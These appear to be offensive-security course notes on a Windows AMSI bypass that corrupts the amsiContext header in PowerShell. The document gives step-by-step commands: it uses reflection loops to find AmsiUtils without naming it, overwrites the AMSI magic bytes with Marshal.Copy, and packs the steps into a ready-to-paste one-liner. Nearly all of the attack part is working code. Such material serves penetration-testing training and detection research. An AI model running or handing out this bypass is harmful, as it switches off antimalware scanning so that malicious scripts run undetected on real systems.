# 06.03 AMSI Bypass amsiContext Corruption

> Section 7.3.1 · GetTypes loop → GetFields loop → Marshal.Copy zeros

## Overview

The amsiContext structure begins with a 4-byte AMSI magic header (0x49534d41 = 'AMSI'). AmsiOpenSession validates this header; if it's corrupted (zeroed), AmsiOpenSession returns E_INVALIDARG (0x80070057) and AMSI shuts down without crashing PowerShell. PowerShell stores amsiContext as a managed IntPtr in System.Management.Automation.AmsiUtils. Access it dynamically via reflection (looping GetTypes/GetFields to avoid literal strings that are themselves AMSI-flagged). Combines into a one-liner.

## Steps

- **Cannot reference 'AmsiUtils' directly** — the string itself triggers AMSI.
- **GetTypes loop** — `$a=[Ref].Assembly.GetTypes(); Foreach($b in $a) {if ($b.Name -like "*iUtils") {$b}}`.
- **GetFields loop** — `$c.GetFields('NonPublic,Static')` → filter `*Context` → `$f.GetValue($null)` returns IntPtr address.
- **Marshal.Copy zeros** — `[IntPtr]$ptr=$g; [Int32[]]$buf=@(0); [Marshal]::Copy($buf, 0, $ptr, 1)` overwrites AMSI header.
- **Result** — AmsiOpenSession returns E_INVALIDARG; all subsequent AMSI scans are skipped.
- **One-liner** — combine all steps into a single semicolon-separated PS statement.

### Overwrite amsiContext header

```powershell
# Overwrite the amsiContext header bytes — zeros corrupt the AMSI magic value
PS C:\Users\Offsec> $a=[Ref].Assembly.GetTypes()

PS C:\Users\Offsec> Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}

PS C:\Users\Offsec> $d=$c.GetFields('NonPublic,Static')

PS C:\Users\Offsec> Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}}

PS C:\Users\Offsec> $g=$f.GetValue($null)

PS C:\Users\Offsec> [IntPtr]$ptr=$g

PS C:\Users\Offsec> [Int32[]]$buf=@(0)

PS C:\Users\Offsec> [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

### One-liner

```powershell
# All steps combined into a single semicolon-separated statement
PS C:\Users\Offsec> $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

PS C:\Users\Offsec> 'amsiutils'
```
